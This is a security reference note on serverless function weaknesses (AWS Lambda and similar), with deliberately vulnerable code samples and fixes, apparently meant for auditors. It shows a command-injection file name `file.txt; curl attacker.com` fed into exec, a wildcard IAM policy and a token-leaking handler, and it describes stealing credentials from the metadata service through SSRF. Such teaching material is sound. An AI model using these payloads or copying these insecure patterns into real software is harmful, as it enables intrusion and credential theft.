# Serverless & FaaS Security Surface

**Tags:** #high #serverless #faas #lambda #aws #azure #gcp
**OWASP:** A04:2021 Insecure Design / Serverless Top 10
**CVSS Base:** 7.5 (High) — 9.8 (Critical with IAM Pivot)

---

## 📖 What it is

Serverless functions (AWS Lambda, Azure Functions, Cloud Functions) shift the attack surface. There are no traditional servers to exploit, but vulnerabilities arise from event data injection, over-privileged IAM execution roles, and data leakage across warm container invocations.

---

## 🔍 `grep_search` Tactics

```
exports.handler
def lambda_handler
context.getRemainingTimeInMillis
event. Records
arn:aws:iam
AmazonS3FullAccess
AWSLambdaBasicExecutionRole
/tmp
boto3.client
```

---

## 💣 Attack Category 1: Event Data Injection

FaaS architectures are event-driven. Events can come from anywhere (API Gateway, S3 triggers, DynamoDB streams). If the function blindly trusts the event payload and passes it directly to execution sinks, it becomes a target.

**Vulnerable Logic (Node.js AWS Lambda):**
```javascript
// Function processes S3 bucket events and uses exec
const { exec } = require('child_process');

exports.handler = async (event) => {
    // Event triggered by S3 file upload
    const filename = event.Records[0].s3.object.key;
    
    // Command Injection  Attacker uploads file named `file.txt; curl attacker.com`
    return new Promise((resolve, reject) => {
        exec(`process_image.sh ${filename}`, (error, stdout) => {
            if (error) reject(error);
            else resolve(stdout);
        });
    });
};
```

**Static Detection:** Trace the flow of the `event` object fields. Treat all incoming data, regardless of trigger source, as untrusted. 

---

## 💣 Attack Category 2: Over-Privileged Execution Roles

Functions should adhere to the Principle of Least Privilege. Often, developers grant `*` (wildcard) access to speed up development. If an attacker gains RCE via code injection, they instantly inherit the function's IAM role.

**Vulnerable Terraform/Serverless Framework:**
```yaml
# serverless.yml
provider:
  iamRoleStatements:
    - Effect: "Allow"
      Action:
        - "s3:*"
        - "dynamodb:*"
      Resource: "*" # CRITICAL  Full access to all buckets/tables
```

**Impact:** Pivot to the entire cloud account. Access to internal secrets mapped logically to the container.

---

## 💣 Attack Category 3: Warm Container Data Leakage

Cloud providers reuse execution environments ("warm containers") to minimize latency. Code executed outside the handler function (e.g., global variables or `/tmp` directory files) persists across specific invocations.

**Vulnerable Logic (Python AWS Lambda):**
```python
import tempfile

global_sessions = {} # Persists across executions for the same container

def lambda_handler(event, context):
    user_id = event.get("user_id")
    token = event.get("token")
    
    # Stores session in memory
    global_sessions[user_id] = token
    
    # Extracts logs to /tmp
    with open('/tmp/debug.json', 'a') as f:
        f.write(f"User {user_id} authenticated.\n")
        
    return {"status": "Success"}
```

**Why it's bad:** A subsequent execution triggered by an attacker on the *same warm container* can access `/tmp/debug.json` or dump `global_sessions` memory to hijack other users' data.

### [NEW] Cold Start Persistence: Exploiting the Lifecycle
**How it works:** Cloud providers eventually recycle containers. However, an attacker can keep a "malicious" container warm by sending frequent ping requests, ensuring their backdoor persists for hours.

---

## 🛡️ Fix

1. **Strict Input Validation:** Implement schema validation (e.g., JSON Schema) on API Gateway and within the function.
2. **Restrictive IAM Roles:** Define specific actions (`s3:GetObject`) and specific resources (`arn:aws:s3:::my-bucket/*`).
3. **Stateless Execution:** Always clear local state (`global` vars) and delete ephemeral `.tmp` files before the execution ends. Do not rely on container teardowns.

### [NEW] Function-to-Function Smuggling
**How it works:** In complex FaaS meshes (Step Functions, Logic Apps), an attacker might smuggle parameters from a low-privilege function to a high-privilege one by injecting extra keys into the shared state.

### [NEW] FaaS Metadata Service Attack
**How it works:** Exploiting SSRF inside a function to access the cloud provider's internal metadata service (e.g., `169.254.169.254`) to steal temporary IAM credentials.

---

## 📌 References
- [[iac-infrastructure-as-code-security]]
- [OWASP Serverless Top 10](https://owasp.org/www-project-serverless-top-10/)
